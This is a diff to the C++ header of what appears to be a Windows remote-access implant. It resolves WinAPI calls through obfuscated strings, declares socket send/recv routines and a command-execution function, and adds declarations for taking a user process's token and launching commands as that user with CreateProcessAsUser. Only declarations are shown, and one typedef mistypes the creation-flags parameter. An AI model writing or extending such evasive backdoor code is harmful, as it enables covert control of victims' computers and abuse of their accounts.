@@ -5,6 +5,8 @@
 #include <tlhelp32.h>
 #include "obfuscate.h"
 #include "windows_structs.h"
+#include "AutoHandle.h"
+
 #define WINAPI_OBFUSCATE(type, name, dll) reinterpret_cast<type>(resolve_winapi(OBFUSCATE(dll), OBFUSCATE(name)))
 
 
@@ -41,12 +43,30 @@ typedef INT(WINAPI* inet_pton_type)(INT Family, PCSTR pszAddrString, PVOID pAddr
 typedef int(WINAPI* connect_type)(SOCKET s, const struct sockaddr FAR* name, int namelen);
 typedef int(WINAPI* send_type)(SOCKET s, const char FAR* buf, int len, int flags);
 typedef int(WINAPI* recv_type)(SOCKET s, const char FAR* buf, int len, int flags);
+typedef BOOL(WINAPI* open_process_token_type)(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
+typedef BOOL(WINAPI* create_process_as_user_a_type)(HANDLE hToken, LPCSTR lpApplicationName, LPCSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, WORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
+BOOL
+WINAPI
+CreateProcessAsUserW(
+    _In_opt_ HANDLE hToken,
+    _In_opt_ LPCWSTR lpApplicationName,
+    _Inout_opt_ LPWSTR lpCommandLine,
+    _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
+    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
+    _In_ BOOL bInheritHandles,
+    _In_ DWORD dwCreationFlags,
+    _In_opt_ LPVOID lpEnvironment,
+    _In_opt_ LPCWSTR lpCurrentDirectory,
+    _In_ LPSTARTUPINFOW lpStartupInfo,
+    _Out_ LPPROCESS_INFORMATION lpProcessInformation
+);
 
-
-std::string exec(const char* cmd);
+std::string exec(const char* cmd, const HANDLE token);
 
 const std::string domain_to_ip(const char* domain);
 
 void initilize_winapi();
 
 FARPROC resolve_winapi(const char* dll_name, const char* func_name);
+
+HANDLE get_token_of_user_process();
